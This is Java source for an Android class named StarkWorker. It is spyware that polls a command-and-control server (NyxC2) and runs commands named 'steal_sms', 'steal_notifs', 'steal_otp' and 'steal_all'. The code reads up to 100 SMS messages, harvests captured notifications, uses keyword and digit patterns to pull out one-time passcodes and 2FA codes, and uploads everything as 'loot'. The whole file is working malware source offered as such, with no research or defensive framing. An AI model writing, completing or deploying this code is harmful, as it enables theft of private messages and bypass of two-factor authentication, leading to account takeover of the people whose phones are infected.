package com.stark.protocol;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class StarkWorker {
    private static final String TAG = "StarkWorker";

    public static JSONObject perms(Context ctx) {
        JSONObject o = new JSONObject();
        try {
            o.put("notifications", notifAccess(ctx));
            o.put("sms", granted(ctx, Manifest.permission.READ_SMS));
            o.put("post_notifications", Build.VERSION.SDK_INT < 33
                    || granted(ctx, Manifest.permission.POST_NOTIFICATIONS));
        } catch (Exception ignored) {}
        return o;
    }

    public static boolean notifAccess(Context ctx) {
        String flat = Settings.Secure.getString(ctx.getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(ctx.getPackageName());
    }

    public static boolean granted(Context ctx, String p) {
        if (Build.VERSION.SDK_INT < 23) return true;
        return ctx.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED;
    }

    public static void sync(Context ctx) {
        try {
            JSONArray cmds = NyxC2.hello(ctx, perms(ctx));
            for (int i = 0; i < cmds.length(); i++) {
                JSONObject c = cmds.optJSONObject(i);
                if (c == null) continue;
                run(ctx, c.optString("cmd", ""));
            }
        } catch (Exception e) {
            Log.w(TAG, "sync", e);
        }
    }

    public static void run(Context ctx, String cmd) {
        if (cmd == null || cmd.isEmpty()) return;
        try {
            switch (cmd) {
                case "steal_notifs":
                    NyxC2.loot(ctx, "notifications", ShadeService.snapshot());
                    break;
                case "steal_sms":
                    stealSms(ctx);
                    break;
                case "steal_otp":
                    stealOtp(ctx);
                    break;
                case "steal_all":
                    NyxC2.loot(ctx, "notifications", ShadeService.snapshot());
                    stealSms(ctx);
                    stealOtp(ctx);
                    break;
                case "ping":
                    NyxC2.loot(ctx, "ping", new JSONObject().put("msg", "pong"));
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            Log.w(TAG, "run " + cmd, e);
        }
    }

    public static void stealSms(Context ctx) {
        JSONArray arr = new JSONArray();
        Cursor cur = null;
        try {
            if (!granted(ctx, Manifest.permission.READ_SMS)) {
                NyxC2.loot(ctx, "sms", arr);
                return;
            }
            cur = ctx.getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
                    null, null, Telephony.Sms.DATE + " DESC");
            int n = 0;
            if (cur != null) {
                while (cur.moveToNext() && n < 100) {
                    JSONObject o = new JSONObject();
                    o.put("from", cur.getString(0));
                    o.put("body", cur.getString(1));
                    o.put("date", cur.getLong(2));
                    o.put("type", cur.getInt(3));
                    arr.put(o);
                    n++;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "sms", e);
        } finally {
            if (cur != null) cur.close();
        }
        NyxC2.loot(ctx, "sms", arr);
    }

    public static void stealOtp(Context ctx) {
        JSONArray out = new JSONArray();
        try {
            JSONArray all = ShadeService.snapshot();
            java.util.regex.Pattern p = java.util.regex.Pattern.compile("\\b(\\d{4,8})\\b");
            for (int i = 0; i < all.length(); i++) {
                JSONObject o = all.optJSONObject(i);
                if (o == null) continue;
                String blob = (o.optString("title") + " " + o.optString("text") + " " + o.optString("big"));
                String low = blob.toLowerCase();
                if (low.contains("code") || low.contains("otp") || low.contains("verify")
                        || low.contains("login") || low.contains("2fa") || p.matcher(blob).find()) {
                    JSONObject row = new JSONObject(o.toString());
                    java.util.regex.Matcher m = p.matcher(blob);
                    if (m.find()) row.put("code", m.group(1));
                    out.put(row);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "otp", e);
        }
        NyxC2.loot(ctx, "otp", out);
    }
}
